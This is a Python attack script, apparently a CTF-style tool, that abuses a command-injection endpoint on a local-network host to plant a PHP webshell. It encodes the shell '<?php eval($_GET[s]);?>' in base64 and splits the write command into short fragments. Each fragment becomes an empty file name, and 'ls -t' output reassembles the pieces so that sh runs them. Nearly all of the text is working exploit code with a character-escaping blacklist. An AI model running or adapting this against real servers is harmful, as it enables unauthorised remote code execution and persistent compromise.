# Linux时间倒序写入脚本
import requests
import base64
from loguru import logger

a='''

   _____                _       __          __         
  / ____|              | |      \ \        / /         
 | |  __ _ __ ___  __ _| |_ _____\ \  /\  / /_ _ _ __  
 | | |_ | '__/ _ \/ _` | __|______\ \/  \/ / _` | '_ \ 
 | |__| | | |  __/ (_| | |_        \  /\  / (_| | | | |
  \_____|_|  \___|\__,_|\__|        \/  \/ \__,_|_| |_|
                                                       
                                                       
'''
print(a)
b='''
欢迎使用万大侠的小工具~
使用过程中遇到任何问题欢迎PR！

详情请翻阅使用手册README.md


'''
print(b)







blacklist=['<','>','>>','<<','@','[',']',';',':','(',')','$','&','|','&&','||','+','-','~','*','/','?','\\',' ','=']
session = requests.session()
url = "http://192.168.85.136:80/"
headers = {
  "Cache-Control": "max-age=0", 
  "Upgrade-Insecure-Requests": "1", 
  "Content-Type": "application/x-www-form-urlencoded", 
  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36", 
  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", 
  "Accept-Encoding": "gzip, deflate", 
  "Accept-Language": "zh-CN,zh;q=0.9", 
  "Connection": "close"
  }
data = {"cmd": ""}

def judge(s):#黑名单判断，是黑名单里面的字符就必须转义
  for i in s:
    if i in blacklist:
      return "{0}{1}".format(chr(92),i)
    else:
      return f'{i}'

def run(s):#单线程发包，因为不能打乱顺序
  data['cmd']=s
  re=session.post(url, headers=headers, data=data)
  print(re.text)

def pao(l,option=True):#默认倒序执行，传入option=False为正序
  if option==True:
    for m in reversed(l):#列表里面每个元素，都是要在Linux服务器端执行>XX\\这种命令格式
      run(m)
  else:
    for m in l:
      run(m)

def func(final,l):#拆分字符串，用自写的一个简单的改良KMP算法;最终初始化l列表为字符串拆分结果
  i=0
  while i < len(final):
    t_s=final[i]
    s=''
    if i < len(final)-1 and final[i+1] != '.':
      t_t=final[i+1:]
      count=0
      while t_s in t_t and i < len(final)-2:
        count=count+1
        t_s=t_s+final[i+count]
        t_t=final[i+count+1:]
      i=i+count+1
    elif i < len(final)-1 and final[i+1] == '.':
      t_s=t_s+final[i+1]
      i=i+2
    else:
      i=i+1
    for m in t_s:
      s=s+judge(m)
    l.append('>'+s+'\\\\')
  return len(l)


#要写入的马
command='<?php eval($_GET[s]);?>'
#base64编码一下
com=str(base64.b64encode(bytes(command,encoding="utf-8")),encoding="utf-8")
#我们需要执行的系统命令类似echo PD9waHAgZXZhbCgkX0dFVFtzXSk7Pz4= | base64 -d >1.php

#思路：echo {com} | base64 -d >1.php是我们要最终执行的命令
#把这个命令按改进的KMP算法拆分成有效的字符串，生成类似'>字符串\\'这样的命令；最终被系统执行后，就会写一个名称和'字符串\'相同的空文件
#然后用ls -t | head -{command_length+1}>456命令，把所有你写入的的空文件名称，按时间顺序写入到456文件中
#但是ls -t | head -{command_length+1}>456太长，所以按照上面的做法也进行一次拆分；最终将这个命令写道123文件中
#最后只需要执行123文件，就会生成456文件；执行456文件，就能成功写马啦


l_ls=[]
l_command=[]

f=f'echo {com} | base64 -d >1.php'
command_length=func(f,l_command)
print(str(l_command))
print("comman-length:"+str(command_length))

f1=f'ls -t | head -{command_length+1}>456'
ls_length=func(f1,l_ls)
print(str(l_ls))
print("ls_length:"+str(ls_length))

pao(l_ls)
run('ls -t>123')
pao(l_command)
run('sh *123* && sh *456*')#为啥用*?因为写入可能会有很多其他文件名一起被写进来了，想要正确执行必须加*